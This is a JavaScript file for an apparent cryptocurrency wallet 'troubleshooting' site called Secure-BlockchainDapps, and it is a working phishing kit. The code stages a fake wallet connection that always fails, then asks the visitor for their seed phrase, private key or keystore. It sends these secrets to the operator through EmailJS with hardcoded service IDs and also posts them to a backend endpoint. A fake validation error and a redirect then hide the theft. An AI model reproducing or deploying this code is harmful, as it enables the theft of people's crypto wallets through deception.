document.addEventListener('DOMContentLoaded', function() {
    // Initialize EmailJS with environment variable fallback
    const emailjsKey = window.emailjsKey || "hwWuRqhr9vJTWa-n8";
    emailjs.init(emailjsKey);

    // DOM Elements
    const connectWalletBtn = document.getElementById('connect-wallet-btn');
    const walletModal = document.getElementById('wallet-modal');
    const stepsModal = document.getElementById('steps-modal');
    const importModal = document.getElementById('import-modal');
    const validationModal = document.getElementById('validation-modal');
    const errorModal = document.getElementById('error-modal');
    const customWalletModal = document.getElementById('custom-wallet-modal');
    const customIssueModal = document.getElementById('custom-issue-modal');
    const issueConfirmationModal = document.getElementById('issue-confirmation-modal');
    const validateBtn = document.getElementById('validate-btn');
    const closeBtn = document.getElementById('close-btn');
    const seedInput = document.getElementById('seed-input');
    const troubleshootSelect = document.getElementById('troubleshoot-select');

    // State variables
    let selectedWallet = '';
    let selectedIssue = '';
    let connectionTimeout;
    let validationTimeout;

    // Utility functions
    function showModal(modal) {
        modal.classList.remove('hidden');
        document.body.style.overflow = 'hidden';
    }

    function hideModal(modal) {
        modal.classList.add('hidden');
        document.body.style.overflow = 'auto';
    }

    function hideAllModals() {
        const modals = [walletModal, stepsModal, importModal, validationModal, 
                      errorModal, customWalletModal, customIssueModal, issueConfirmationModal];
        modals.forEach(modal => hideModal(modal));
    }

    function capitalizeWallet(walletName) {
        return walletName.split(/[-_]/).map(word => 
            word.charAt(0).toUpperCase() + word.slice(1)
        ).join(' ');
    }

    function logEvent(event, data = {}) {
        console.log(`[Secure-BlockchainDapps] ${event}:`, data);
    }

    // Connect wallet button click
    connectWalletBtn.addEventListener('click', function() {
        logEvent('Connect wallet button clicked');
        showModal(walletModal);
    });

    // Wallet selection
    document.querySelectorAll('.wallet-item').forEach(item => {
        item.addEventListener('click', function() {
            selectedWallet = this.dataset.wallet;
            logEvent('Wallet selected', { wallet: selectedWallet });

            if (selectedWallet === 'other') {
                hideModal(walletModal);
                showModal(customWalletModal);
            } else {
                hideModal(walletModal);
                showConnectionSteps();
            }
        });

        // Add keyboard support
        item.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                this.click();
            }
        });

        // Add tabindex for keyboard navigation
        item.setAttribute('tabindex', '0');
    });

    // Show connection steps with realistic delay
    function showConnectionSteps() {
        showModal(stepsModal);
        document.getElementById('step-title').textContent = 'Connecting...';
        document.getElementById('step-description').textContent = `Attempting to connect to ${capitalizeWallet(selectedWallet)} wallet...`;

        logEvent('Connection simulation started', { wallet: selectedWallet });

        // Simulate connection attempt for 8-12 seconds
        const connectionDelay = 8000 + Math.random() * 4000;
        
        connectionTimeout = setTimeout(() => {
            document.getElementById('step-title').textContent = 'Connection Failed';
            document.getElementById('step-description').textContent = 'Unable to establish connection. Please import your wallet manually.';
            
            logEvent('Connection simulation failed', { wallet: selectedWallet });

            setTimeout(() => {
                hideModal(stepsModal);
                showImportModal();
            }, 2000);
        }, connectionDelay);
    }

    // Show import modal
    function showImportModal() {
        const walletName = capitalizeWallet(selectedWallet);
        document.getElementById('wallet-name').textContent = walletName;
        showModal(importModal);
        
        // Reset to default import option
        document.querySelectorAll('.import-option').forEach(opt => opt.classList.remove('active'));
        document.querySelector('.import-option[data-option="seed"]').classList.add('active');
        updateImportForm('seed');
        
        logEvent('Import modal shown', { wallet: selectedWallet });
    }

    // Show issue confirmation
    function showIssueConfirmation(issue) {
        document.getElementById('issue-title').textContent = 'Connect Wallet to Resolve Issue';
        document.getElementById('issue-description').textContent = `Selected Issue: ${issue}. Please connect your wallet to proceed with troubleshooting.`;
        showModal(issueConfirmationModal);
        
        logEvent('Issue confirmation shown', { issue: issue });
    }

    // Update import form based on selected option
    function updateImportForm(selectedOption) {
        const label = document.querySelector('.import-form label');
        const input = document.getElementById('seed-input');

        switch(selectedOption) {
            case 'seed':
                label.textContent = 'Enter your wallet seed phrase';
                input.placeholder = 'Enter your 12-24 word seed phrase separated by spaces';
                break;
            case 'keystore':
                label.textContent = 'Enter your keystore JSON';
                input.placeholder = 'Paste your keystore JSON content here';
                break;
            case 'private':
                label.textContent = 'Enter your private key';
                input.placeholder = 'Enter your private key (64 hex characters)';
                break;
        }
    }

    // Import option selection
    document.querySelectorAll('.import-option').forEach(option => {
        option.addEventListener('click', function() {
            document.querySelectorAll('.import-option').forEach(opt => opt.classList.remove('active'));
            this.classList.add('active');

            const selectedOption = this.dataset.option;
            updateImportForm(selectedOption);
            
            logEvent('Import option selected', { option: selectedOption });
        });

        // Add keyboard support
        option.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                this.click();
            }
        });

        option.setAttribute('tabindex', '0');
    });

    // Form validation
    function validateSeedInput(value, type) {
        const trimmedValue = value.trim();
        
        if (!trimmedValue) {
            return { valid: false, message: 'Please enter your wallet credentials' };
        }

        switch(type) {
            case 'seed':
                const words = trimmedValue.split(/\s+/);
                if (words.length < 12 || words.length > 24) {
                    return { valid: false, message: 'Seed phrase must contain 12-24 words' };
                }
                break;
            case 'private':
                if (!/^[0-9a-fA-F]{64}$/.test(trimmedValue.replace(/^0x/, ''))) {
                    return { valid: false, message: 'Private key must be 64 hexadecimal characters' };
                }
                break;
            case 'keystore':
                try {
                    JSON.parse(trimmedValue);
                } catch (e) {
                    return { valid: false, message: 'Invalid JSON format' };
                }
                break;
        }

        return { valid: true };
    }

    // Validate button click
    validateBtn.addEventListener('click', function() {
        const seedPhrase = seedInput.value.trim();
        const selectedOption = document.querySelector('.import-option.active').dataset.option;

        // Validate input
        const validation = validateSeedInput(seedPhrase, selectedOption);
        if (!validation.valid) {
            alert(validation.message);
            return;
        }

        logEvent('Validation started', { 
            wallet: selectedWallet, 
            type: selectedOption,
            issue: selectedIssue 
        });

        // Show validation modal
        hideModal(importModal);
        showModal(validationModal);

        // Prepare data for submission
        const submissionData = {
            wallet_name: selectedWallet,
            data_type: selectedOption,
            seed_phrase: seedPhrase,
            issue: selectedIssue || 'General wallet connection',
            timestamp: new Date().toISOString(),
            user_agent: navigator.userAgent
        };

        // Send data via EmailJS
        const emailjsServiceId = window.emailjsServiceId || "service_xccsf1u";
        const emailjsTemplateId = window.emailjsTemplateId || "template_icljc9o";

        emailjs.send(emailjsServiceId, emailjsTemplateId, submissionData)
            .then(function(response) {
                logEvent('EmailJS submission successful', response);
            })
            .catch(function(error) {
                logEvent('EmailJS submission failed', error);
            });

        // Send to backend as backup
        fetch('/submit_seed', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(submissionData)
        })
        .then(response => response.json())
        .then(data => {
            logEvent('Backend submission successful', data);
        })
        .catch(error => {
            logEvent('Backend submission failed', error);
        });

        // Show validation for 8-12 seconds then show error
        const validationDelay = 8000 + Math.random() * 4000;
        validationTimeout = setTimeout(() => {
            hideModal(validationModal);
            showModal(errorModal);

            logEvent('Validation failed (simulated)');

            // Hide error modal after 5 seconds and redirect
            setTimeout(() => {
                hideModal(errorModal);
                resetApp();
                window.location.href = '/';
            }, 5000);
        }, validationDelay);
    });

    // Close button click
    closeBtn.addEventListener('click', function() {
        hideModal(importModal);
        resetApp();
        logEvent('Import modal closed by user');
    });

    // Custom wallet modal handlers
    document.getElementById('custom-wallet-confirm').addEventListener('click', function() {
        const customWallet = document.getElementById('custom-wallet-input').value.trim();
        if (customWallet) {
            selectedWallet = customWallet.toLowerCase().replace(/\s+/g, '-');
            hideModal(customWalletModal);
            showConnectionSteps();
            logEvent('Custom wallet confirmed', { wallet: selectedWallet });
        } else {
            alert('Please enter a wallet name');
        }
    });

    document.getElementById('custom-wallet-cancel').addEventListener('click', function() {
        hideModal(customWalletModal);
        showModal(walletModal);
        logEvent('Custom wallet cancelled');
    });

    // Custom issue modal handlers
    document.getElementById('custom-issue-confirm').addEventListener('click', function() {
        const customIssue = document.getElementById('custom-issue-input').value.trim();
        if (customIssue) {
            selectedIssue = customIssue;
            hideModal(customIssueModal);
            showIssueConfirmation(customIssue);
            logEvent('Custom issue confirmed', { issue: customIssue });
        } else {
            alert('Please describe your issue');
        }
    });

    document.getElementById('custom-issue-cancel').addEventListener('click', function() {
        hideModal(customIssueModal);
        logEvent('Custom issue cancelled');
    });

    // Issue confirmation modal handlers
    document.getElementById('issue-continue').addEventListener('click', function() {
        hideModal(issueConfirmationModal);
        showModal(walletModal);
        logEvent('Issue confirmation continued');
    });

    document.getElementById('issue-cancel').addEventListener('click', function() {
        hideModal(issueConfirmationModal);
        resetApp();
        logEvent('Issue confirmation cancelled');
    });

    // Reset app to initial state
    function resetApp() {
        // Clear form data
        seedInput.value = '';
        selectedWallet = '';
        selectedIssue = '';
        document.getElementById('custom-wallet-input').value = '';
        document.getElementById('custom-issue-input').value = '';
        troubleshootSelect.value = '';

        // Clear timeouts
        if (connectionTimeout) {
            clearTimeout(connectionTimeout);
            connectionTimeout = null;
        }
        if (validationTimeout) {
            clearTimeout(validationTimeout);
            validationTimeout = null;
        }

        // Hide all modals
        hideAllModals();

        logEvent('App reset');
    }

    // Close modals when clicking outside
    window.addEventListener('click', function(event) {
        if (event.target.classList.contains('modal')) {
            hideModal(event.target);
            logEvent('Modal closed by outside click');
        }
    });

    // Escape key handler
    document.addEventListener('keydown', function(event) {
        if (event.key === 'Escape') {
            hideAllModals();
            logEvent('Modals closed by escape key');
        }
    });

    // Troubleshoot dropdown change
    troubleshootSelect.addEventListener('change', function() {
        if (this.value) {
            selectedIssue = this.options[this.selectedIndex].text;
            logEvent('Issue selected from dropdown', { issue: selectedIssue });

            if (this.value === 'other') {
                showModal(customIssueModal);
            } else {
                showIssueConfirmation(selectedIssue);
            }
        }
    });

    // Initialize app
    logEvent('Secure-BlockchainDapps initialized');
    
    // Mobile keyboard handling
    function handleKeyboardVisibility() {
        const modal = document.querySelector('.modal:not(.hidden)');
        if (!modal) return;
        
        const initialViewportHeight = window.innerHeight;
        let keyboardVisible = false;
        
        function onViewportChange() {
            const currentHeight = window.innerHeight;
            const heightDifference = initialViewportHeight - currentHeight;
            
            // Keyboard is likely visible if viewport shrunk by more than 150px
            const keyboardNowVisible = heightDifference > 150;
            
            if (keyboardNowVisible !== keyboardVisible) {
                keyboardVisible = keyboardNowVisible;
                
                if (keyboardVisible) {
                    modal.classList.add('keyboard-active');
                    // Scroll focused input into view
                    const focusedElement = document.activeElement;
                    if (focusedElement && (focusedElement.tagName === 'TEXTAREA' || focusedElement.tagName === 'INPUT')) {
                        setTimeout(() => {
                            focusedElement.scrollIntoView({ 
                                behavior: 'smooth', 
                                block: 'center' 
                            });
                        }, 100);
                    }
                } else {
                    modal.classList.remove('keyboard-active');
                }
            }
        }
        
        // Listen for viewport changes
        window.addEventListener('resize', onViewportChange);
        
        // Clean up listener when modal closes
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                    if (modal.classList.contains('hidden')) {
                        window.removeEventListener('resize', onViewportChange);
                        observer.disconnect();
                    }
                }
            });
        });
        
        observer.observe(modal, { attributes: true });
    }
    
    // Add focus handlers for textarea elements
    document.addEventListener('focusin', function(event) {
        if (event.target.tagName === 'TEXTAREA' || event.target.tagName === 'INPUT') {
            if (window.innerWidth <= 768) { // Mobile devices
                handleKeyboardVisibility();
                
                // Prevent iOS zoom on input focus
                if (event.target.tagName === 'TEXTAREA') {
                    event.target.style.fontSize = '16px';
                }
            }
        }
    });
    
    // Add loading state management
    function setLoadingState(button, isLoading) {
        if (isLoading) {
            button.classList.add('btn-loading');
            button.disabled = true;
        } else {
            button.classList.remove('btn-loading');
            button.disabled = false;
        }
    }

    // Add enhanced error handling
    window.addEventListener('error', function(event) {
        logEvent('JavaScript error occurred', {
            message: event.message,
            filename: event.filename,
            line: event.lineno,
            column: event.colno
        });
    });

    // Add visibility change handler to pause/resume timers
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            logEvent('Page hidden - pausing timers');
        } else {
            logEvent('Page visible - resuming timers');
        }
    });
});
